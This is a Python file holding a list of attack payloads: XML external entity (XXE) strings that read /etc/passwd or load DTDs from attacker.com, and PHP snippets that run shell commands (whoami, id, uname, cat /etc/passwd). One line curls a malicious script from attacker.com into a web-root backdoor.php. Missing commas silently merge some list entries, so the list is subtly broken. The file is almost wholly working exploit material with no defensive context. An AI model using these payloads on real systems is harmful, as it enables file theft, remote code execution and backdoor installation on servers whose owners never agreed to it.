# -*- coding: utf-8 -*-
XXE_payloads = [
    "<!DOCTYPE data [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>\n<data>&xxe;</data>",
    "<!DOCTYPE data [<!ENTITY xxe SYSTEM 'http://attacker.com/evil-file'>]>\n<data>&xxe;</data>",
    "<!DOCTYPE data [\n  <!ENTITY % xxe SYSTEM 'file:///etc/passwd'>\n  %xxe;\n]>\n<data>&xxe;</data>",
    "<!DOCTYPE data [\n  <!ENTITY % xxe SYSTEM 'http://attacker.com/evil-file'>\n  %xxe;\n]>\n<data>&xxe;</data>",
    "<!DOCTYPE data [\n  <!ENTITY % file SYSTEM 'file:///etc/passwd'>\n  <!ENTITY % remote SYSTEM 'http://attacker.com/evil-file'>\n  %file;%remote;\n]>\n<data>&file;</data>",
    "<!DOCTYPE data SYSTEM 'http://attacker.com/evil.dtd'>\n<data>&xxe;</data>"
    #PHP 
    "<?php echo 'Hello, World!'; ?>",
    "<?php phpinfo(); ?>",
    "<?php system('ls -la'); ?>",
    "<?php system('cat /etc/passwd'); ?>",
    "<?php eval(base64_decode('c3Vic3Ry')); ?>",
    "<?php passthru('whoami'); ?>",
    "<?php system('whoami'); ?>",
    "<?php echo shell_exec('whoami'); ?>",
    "<?php exec('/bin/bash -c \"whoami\"'); ?>",
    "<?php echo exec('whoami'); ?>",
    "<?php system('id'); ?>",
    "<?php echo shell_exec('id'); ?>",
    "<?php echo exec('id'); ?>",
    "<?php passthru('id'); ?>",
    "<?php system('uname -a'); ?>",
    "<?php echo shell_exec('uname -a'); ?>",
    "<?php echo exec('uname -a'); ?>",
    "<?php passthru('uname -a'); ?>",
    "<?php system('curl http://attacker.com/malicious_script.php -o /var/www/html/backdoor.php'); ?>",
    "<?php include('/etc/passwd'); ?>"
    # Пейлоады с external DTD
    """<!ENTITY %% xxe SYSTEM "file:///etc/passwd">
    <!ENTITY %% remote SYSTEM "http://attacker.com/evil-file">
    %%xxe;%%remote;"""

    
]
